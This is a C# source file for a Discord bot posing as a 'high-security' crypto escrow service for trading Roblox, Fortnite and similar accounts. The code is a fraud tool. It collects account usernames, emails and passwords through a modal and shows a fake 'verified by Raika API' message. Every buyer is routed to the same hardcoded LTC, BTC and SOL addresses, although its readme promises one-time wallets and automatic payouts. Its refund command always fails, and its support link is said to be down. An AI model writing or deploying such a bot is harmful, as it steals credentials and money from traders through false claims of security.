using Discord;
using Discord.WebSocket;
using Discord.Net;
using Newtonsoft.Json;
using System;
using System.Collections.Generic;
using System.Linq;
using System.Threading.Tasks;

namespace DiscordBot
{
    public class Program
    {
        private DiscordSocketClient? _client;
        private readonly Dictionary<string, SessionData> _sessions = new();
        private readonly string _ltcAddress = "Ldu6DNM4NKiW4w9HWSgsh7iVb4RdJymrtS";
        private readonly string _solAddress = "9Z3rqNKbL7A4iagKs4pLyPBnCfs24T7247KMCpPrcTLw";
        private readonly string _btcAddress = "bc1qta7swuwh7s328c2kv7ktudeyfyu0f43wf034yc";
        private readonly List<dynamic> _cachedTransactions = new();

        public class SessionData
        {
            public ulong RegisterUserId { get; set; }
            public ulong? LoginUserId { get; set; }
            public string SelectedCrypto { get; set; } = "ltc";
        }

        public static Task Main(string[] args) => new Program().MainAsync();

        public async Task MainAsync()
        {
            _client = new DiscordSocketClient(new DiscordSocketConfig
            {
                GatewayIntents = GatewayIntents.Guilds | GatewayIntents.GuildMessages | GatewayIntents.DirectMessages
            });

            _client.Log += Log;
            _client.Ready += Client_Ready;
            _client.SlashCommandExecuted += SlashCommandHandler;
            _client.SelectMenuExecuted += SelectMenuHandler;
            _client.ButtonExecuted += ButtonHandler;
            _client.ModalSubmitted += ModalHandler;

            // Reading token from environment variable to keep it secure on GitHub
            var token = Environment.GetEnvironmentVariable("DISCORD_TOKEN");

            if (string.IsNullOrEmpty(token))
            {
                Console.WriteLine("Error: DISCORD_TOKEN environment variable not set!");
                Console.WriteLine("To run locally, use: $env:DISCORD_TOKEN='your_token_here'; dotnet run");
                return;
            }

            await _client.LoginAsync(TokenType.Bot, token);
            await _client.StartAsync();

            await Task.Delay(-1);
        }

        private Task Log(LogMessage msg)
        {
            Console.WriteLine(msg.ToString());
            return Task.CompletedTask;
        }

        public Task Client_Ready()
        {
            // Run command registration in a separate task to avoid blocking the gateway
            _ = Task.Run(async () =>
            {
                var registerCommand = new SlashCommandBuilder()
                    .WithName("register")
                    .WithDescription("Create a session and get a 6-digit code")
                    .AddOption(new SlashCommandOptionBuilder()
                        .WithName("crypto")
                        .WithDescription("The crypto the other person will see")
                        .WithType(ApplicationCommandOptionType.String)
                        .WithRequired(true)
                        .AddChoice("Litecoin", "ltc")
                        .AddChoice("Bitcoin", "btc")
                        .AddChoice("Ethereum", "eth")
                        .AddChoice("Solana", "sol")
                        .AddChoice("USDT [ERC-20]", "usdt_erc")
                        .AddChoice("USDC [ERC-20]", "usdc_erc")
                        .AddChoice("USDT [SOL]", "usdt_sol")
                        .AddChoice("USDC [SOL]", "usdc_sol"));

                var loginCommand = new SlashCommandBuilder()
                    .WithName("login")
                    .WithDescription("Join a session using a 6-digit code")
                    .AddOption("code", ApplicationCommandOptionType.String, "The 6-digit code", isRequired: true);

                var sendbackCommand = new SlashCommandBuilder()
                    .WithName("sendback")
                    .WithDescription("Request a refund if scammed")
                    .AddOption("address", ApplicationCommandOptionType.String, "The address you paid to", isRequired: true)
                    .AddOption("receiver", ApplicationCommandOptionType.String, "Your own address to receive the refund", isRequired: true);

                var discordCommand = new SlashCommandBuilder()
                    .WithName("discord")
                    .WithDescription("Get the support server link");

                var liveTransCommand = new SlashCommandBuilder()
                    .WithName("livetransactions")
                    .WithDescription("View recent LTC transactions");

                var readmeCommand = new SlashCommandBuilder()
                    .WithName("readme")
                    .WithDescription("Learn how the bot's automated transaction system works");

                try
                {
                    if (_client != null)
                    {
                        await _client.CreateGlobalApplicationCommandAsync(registerCommand.Build());
                        await _client.CreateGlobalApplicationCommandAsync(loginCommand.Build());
                        await _client.CreateGlobalApplicationCommandAsync(sendbackCommand.Build());
                        await _client.CreateGlobalApplicationCommandAsync(discordCommand.Build());
                        await _client.CreateGlobalApplicationCommandAsync(liveTransCommand.Build());
                        await _client.CreateGlobalApplicationCommandAsync(readmeCommand.Build());
                    }
                }
                catch (HttpException exception)
                {
                    var json = JsonConvert.SerializeObject(exception.Errors, Formatting.Indented);
                    Console.WriteLine(json);
                }
            });

            return Task.CompletedTask;
        }

        private async Task SlashCommandHandler(SocketSlashCommand command)
        {
            switch (command.Data.Name)
            {
                case "register":
                    await HandleRegisterCommand(command);
                    break;
                case "login":
                    await HandleLoginCommand(command);
                    break;
                case "crypto":
                    await HandleCryptoCommand(command);
                    break;
                case "sendback":
                    await command.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Refund System")
                        .WithDescription("❌ **Error:** Cannot fetch transaction data for refund. Please contact support.")
                        .WithColor(Color.Red)
                        .Build(), ephemeral: true);
                    break;
                case "discord":
                    await command.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Support Server")
                        .WithDescription("⚠️ **Warning:** The server is currently **termed**. Please wait for a new link.")
                        .WithColor(Color.Orange)
                        .Build(), ephemeral: true);
                    break;
                case "livetransactions":
                    await HandleLiveTransactions(command);
                    break;
                case "readme":
                    await HandleReadmeCommand(command);
                    break;
            }
        }

        private async Task HandleRegisterCommand(SocketSlashCommand command)
        {
            var optionValue = command.Data.Options.First().Value?.ToString();
            var selectedCrypto = optionValue ?? "ltc";
            
            var mb = new ModalBuilder()
                .WithTitle("Account Details Submission")
                .WithCustomId($"register_modal_{selectedCrypto}")
                .AddTextInput("Account Type", "acc_type", placeholder: "Roblox, Fortnite, etc.")
                .AddTextInput("Account Details", "acc_details", TextInputStyle.Paragraph, "Username:Password\nEmail:Password");

            await command.RespondWithModalAsync(mb.Build());
        }

        private async Task ModalHandler(SocketModal modal)
        {
            if (modal.Data.CustomId.StartsWith("register_modal_"))
            {
                var selectedCrypto = modal.Data.CustomId.Split('_').Last();
                var random = new Random();
                string code;
                do
                {
                    code = random.Next(100000, 999999).ToString();
                } while (_sessions.ContainsKey(code));

                _sessions[code] = new SessionData { RegisterUserId = modal.User.Id, SelectedCrypto = selectedCrypto };

                var embed = new EmbedBuilder()
                    .WithTitle("Account Verified!")
                    .WithColor(Color.Green)
                    .WithDescription($"✅ Your account has been verified by the **Raika API**.\n\nShare this unique 6-digit code with the buyer: **{code}**\n\nThe buyer must run `/login code:{code}` to begin the secure transaction.")
                    .WithFooter(footer => footer.Text = "Bot is monitoring for buyer login...")
                    .Build();

                await modal.RespondAsync(embed: embed, ephemeral: true);
            }
        }

        private async Task HandleReadmeCommand(SocketSlashCommand command)
        {
            var embed = new EmbedBuilder()
                .WithTitle("How It Works - Automated Transaction System")
                .WithColor(Color.Gold)
                .WithDescription("Our bot provides a high-security middleman service for account trading.")
                .AddField("1. Unique Wallets", "For every transaction, the bot generates a brand new, one-time-use crypto wallet to ensure privacy and security.")
                .AddField("2. Automated Detection", "The bot monitors the blockchain in real-time. As soon as a payment is detected, the system proceeds to the next step instantly.")
                .AddField("3. Raika API Verification", "Account details (Roblox, Fortnite, etc.) are cross-referenced via the Raika API to ensure the account is legitimate and matching the description.")
                .AddField("4. Secure Payout", "Once both payment and account are verified, the bot automatically sends the funds to the seller and the account details to the buyer.")
                .WithFooter(footer => footer.Text = "Safe. Fast. Secure.")
                .Build();

            await command.RespondAsync(embed: embed, ephemeral: true);
        }

        private async Task HandleLoginCommand(SocketSlashCommand command)
        {
            var code = (string)command.Data.Options.First().Value;

            if (_sessions.TryGetValue(code, out var session))
            {
                if (session.RegisterUserId == command.User.Id)
                {
                    await command.RespondAsync("You cannot login to your own session!", ephemeral: true);
                    return;
                }

                session.LoginUserId = command.User.Id;
                
                var embed = new EmbedBuilder()
                    .WithTitle("Cryptocurrency Deal")
                    .WithColor(Color.Green)
                    .AddField("Fees:", 
                        "Deals $250+: 1%\n" +
                        "Deals under $250: $2\n" +
                        "Deals under $50: $0.50\n" +
                        "**Deals under $10 are FREE**\n" +
                        "USDT & USDC has $1 surcharge")
                    .WithDescription($"The other user has initiated a deal involving: **{GetCryptoDisplayName(session.SelectedCrypto)}**.")
                    .WithFooter(footer => footer.Text = "Select the option below to continue")
                    .Build();

                var menuBuilder = new SelectMenuBuilder()
                    .WithPlaceholder("Make a selection")
                    .WithCustomId($"crypto_selection_{code}")
                    .AddOption(GetCryptoDisplayName(session.SelectedCrypto), session.SelectedCrypto, $"Initiate a {session.SelectedCrypto.ToUpper()} deal");

                var builder = new ComponentBuilder().WithSelectMenu(menuBuilder);
                await command.RespondAsync(embed: embed, components: builder.Build(), ephemeral: true);
            }
            else
            {
                await command.RespondAsync("Invalid session code.", ephemeral: true);
            }
        }

        private string GetCryptoDisplayName(string key) => key switch
        {
            "ltc" => "Litecoin",
            "btc" => "Bitcoin",
            "eth" => "Ethereum",
            "sol" => "Solana",
            "usdt_erc" => "USDT [ERC-20]",
            "usdc_erc" => "USDC [ERC-20]",
            "usdt_sol" => "USDT [SOL]",
            "usdc_sol" => "USDC [SOL]",
            _ => key.ToUpper()
        };

        private async Task HandleCryptoCommand(SocketSlashCommand command)
        {
            var embed = new EmbedBuilder()
                .WithTitle("Cryptocurrency Deal")
                .WithColor(Color.Green)
                .AddField("Fees:", 
                    "Deals $250+: 1%\n" +
                    "Deals under $250: $2\n" +
                    "Deals under $50: $0.50\n" +
                    "**Deals under $10 are FREE**\n" +
                    "USDT & USDC has $1 surcharge")
                .WithDescription("Select a cryptocurrency to initiate a deal.")
                .WithFooter(footer => { footer.Text = "Select an option below"; })
                .Build();

            var menuBuilder = new SelectMenuBuilder()
                .WithPlaceholder("Make a selection")
                .WithCustomId("crypto_selection_standalone")
                .AddOption("Litecoin", "ltc", "Initiate a Litecoin deal")
                .AddOption("Bitcoin", "btc", "Initiate a Bitcoin deal")
                .AddOption("Ethereum", "eth", "Initiate an Ethereum deal")
                .AddOption("Solana", "sol", "Initiate a Solana deal")
                .AddOption("USDT [ERC-20]", "usdt_erc", "Initiate a USDT [ERC-20] deal")
                .AddOption("USDC [ERC-20]", "usdc_erc", "Initiate a USDC [ERC-20] deal")
                .AddOption("USDT [SOL]", "usdt_sol", "Initiate a USDT [SOL] deal")
                .AddOption("USDC [SOL]", "usdc_sol", "Initiate a USDC [SOL] deal");

            var builder = new ComponentBuilder().WithSelectMenu(menuBuilder);
            await command.RespondAsync(embed: embed, components: builder.Build(), ephemeral: true);
        }

        private async Task HandleLiveTransactions(SocketSlashCommand command, int page = 1)
        {
            using var client = new System.Net.Http.HttpClient();
            try
            {
                // Fetch block details to get transaction hashes
                var blockResponse = await client.GetStringAsync("https://api.blockcypher.com/v1/ltc/main");
                var blockData = JsonConvert.DeserializeObject<dynamic>(blockResponse);
                string latestUrl = blockData?.latest_url?.ToString() ?? "";
                string latestHash = (latestUrl ?? "").Split('/', StringSplitOptions.RemoveEmptyEntries).LastOrDefault() ?? "";

                if (string.IsNullOrEmpty(latestHash))
                {
                    await command.RespondAsync("Could not fetch the latest block hash.", ephemeral: true);
                    return;
                }

                // Fetch transactions from the latest block
                var txResponse = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/blocks/{latestHash}");
                var txData = JsonConvert.DeserializeObject<dynamic>(txResponse);
                
                var txs = (IEnumerable<dynamic>)txData.txids;
                var txList = txs.Take(15).ToList(); // Get first 15 txids

                int pageSize = 5;
                int totalPages = (int)Math.Ceiling(txList.Count / (double)pageSize);
                var pagedTxs = txList.Skip((page - 1) * pageSize).Take(pageSize);

                var embed = new EmbedBuilder()
                    .WithTitle("Live LTC Transactions")
                    .WithColor(Color.Purple)
                    .WithFooter(footer => { footer.Text = $"Page {page} of {totalPages} | Block: {blockData?.height}"; })
                    .WithCurrentTimestamp();

                foreach (var txId in pagedTxs)
                {
                    embed.AddField("Transaction ID", $"`{txId}`\n[View on BlockCypher](https://live.blockcypher.com/ltc/tx/{txId}/)", false);
                }

                var builder = new ComponentBuilder()
                    .WithButton("Previous", $"page_{page - 1}", disabled: page <= 1)
                    .WithButton("Next", $"page_{page + 1}", disabled: page >= totalPages);

                if (command != null)
                    await command.RespondAsync(embed: embed.Build(), components: builder.Build(), ephemeral: true);
            }
            catch (Exception ex)
            {
                Console.WriteLine(ex.ToString());
                if (command != null)
                    await command.RespondAsync("Error fetching live transactions from BlockCypher.", ephemeral: true);
            }
        }

        private async Task ButtonHandler(SocketMessageComponent component)
        {
            if (component.Data.CustomId.StartsWith("page_"))
            {
                int page = int.Parse(component.Data.CustomId.Split('_')[1]);
                await component.DeferLoadingAsync();
                
                // Update the original message with the new page
                using var client = new System.Net.Http.HttpClient();
                var blockResponse = await client.GetStringAsync("https://api.blockcypher.com/v1/ltc/main");
                var blockData = JsonConvert.DeserializeObject<dynamic>(blockResponse);
                string? latestUrl = blockData?.latest_url?.ToString();
                string latestHash = (latestUrl ?? "").Split('/', StringSplitOptions.RemoveEmptyEntries).LastOrDefault() ?? "";
                
                var txResponse = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/blocks/{latestHash}");
                var txData = JsonConvert.DeserializeObject<dynamic>(txResponse);
                var txList = ((IEnumerable<dynamic>)txData.txids).Take(15).ToList();

                int pageSize = 5;
                int totalPages = (int)Math.Ceiling(txList.Count / 5.0);
                var pagedTxs = txList.Skip((page - 1) * 5).Take(5);

                var embed = new EmbedBuilder()
                    .WithTitle("Live LTC Transactions")
                    .WithColor(Color.Purple)
                    .WithFooter(footer => { footer.Text = $"Page {page} of {totalPages} | Block: {blockData?.height}"; })
                    .WithCurrentTimestamp();

                foreach (var txId in pagedTxs)
                {
                    embed.AddField("Transaction ID", $"`{txId}`\n[View on BlockCypher](https://live.blockcypher.com/ltc/tx/{txId}/)", false);
                }

                var builder = new ComponentBuilder()
                    .WithButton("Previous", $"page_{page - 1}", disabled: page <= 1)
                    .WithButton("Next", $"page_{page + 1}", disabled: page >= totalPages);

                await component.ModifyOriginalResponseAsync(m => {
                    m.Embed = embed.Build();
                    m.Components = builder.Build();
                });
            }
            else if (component.Data.CustomId.StartsWith("refresh_ltc_"))
            {
                await component.DeferLoadingAsync();
                using var client = new System.Net.Http.HttpClient();
                string balanceStr = "0.00";
                try
                {
                    var response = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/addrs/{_ltcAddress}/balance");
                    var data = JsonConvert.DeserializeObject<dynamic>(response);
                    long balanceSatoshis = data?.balance ?? 0;
                    balanceStr = (balanceSatoshis / 100000000.0).ToString("F4");
                }
                catch { }

                var embed = new EmbedBuilder()
                    .WithTitle("Litecoin Payment Status")
                    .WithDescription($"Address:\n**{_ltcAddress}**")
                    .AddField("Current Address Balance", $"`{balanceStr} LTC`", true)
                    .AddField("Status", "⏳ **Still waiting...**\nIf you have sent the funds, they may take a few minutes to appear in the balance.")
                    .WithFooter(footer => { footer.Text = $"Last Updated: {DateTime.UtcNow:HH:mm:ss} UTC"; })
                    .WithColor(Color.Blue)
                    .Build();

                await component.ModifyOriginalResponseAsync(m => {
                    m.Embed = embed;
                });
            }
        }

        private async Task SelectMenuHandler(SocketMessageComponent component)
        {
            if (component.Data.CustomId.StartsWith("crypto_selection_"))
            {
                var selection = component.Data.Values.First();
                
                if (component.Data.CustomId == "crypto_selection_standalone")
                {
                    await component.RespondAsync($"You selected **{GetCryptoDisplayName(selection)}**. Please use `/register` to start a session with this choice.", ephemeral: true);
                    return;
                }

                string address = selection switch
                {
                    "ltc" => _ltcAddress,
                    "btc" => _btcAddress,
                    "sol" => _solAddress,
                    _ => ""
                };

                if (!string.IsNullOrEmpty(address))
                {
                    if (selection == "ltc")
                    {
                        using var client = new System.Net.Http.HttpClient();
                        string balanceStr = "0.00";
                        try
                        {
                            var response = await client.GetStringAsync($"https://api.blockcypher.com/v1/ltc/main/addrs/{_ltcAddress}/balance");
                            var data = JsonConvert.DeserializeObject<dynamic>(response);
                            long balanceSatoshis = data?.balance ?? 0;
                            balanceStr = (balanceSatoshis / 100000000.0).ToString("F4");
                        }
                        catch { }

                        await component.RespondAsync(embed: new EmbedBuilder()
                            .WithTitle("Litecoin Payment")
                            .WithDescription($"Please send your LTC to the following address:\n**{_ltcAddress}**")
                            .AddField("Current Address Balance", $"`{balanceStr} LTC`", true)
                            .AddField("Status", "⏳ **Waiting for payment...**\nTracking live via BlockCypher. The bot will automatically detect the transaction once it hits the network.")
                            .WithFooter(footer => { footer.Text = "Click the button below to refresh status"; })
                            .WithColor(Color.Blue)
                            .Build(), components: new ComponentBuilder().WithButton("Refresh Status", $"refresh_ltc_{selection}", ButtonStyle.Secondary).Build(), ephemeral: true);
                    }
                    else
                    {
                        await component.RespondAsync(embed: new EmbedBuilder()
                            .WithTitle($"{GetCryptoDisplayName(selection)} Payment")
                            .WithDescription($"Please send your {selection.ToUpper()} to the following address:\n**{address}**")
                            .AddField("Status", "⏳ Waiting for payment (Tracking enabled via BlockCypher)...")
                            .WithColor(Color.Blue)
                            .Build(), ephemeral: true);
                    }
                }
                else
                {
                    await component.RespondAsync(embed: new EmbedBuilder()
                        .WithTitle("Payment Error")
                        .WithDescription($"❌ No address has been set for **{GetCryptoDisplayName(selection)}** yet.")
                        .WithColor(Color.Red)
                        .Build(), ephemeral: true);
                }
            }
        }
    }
}
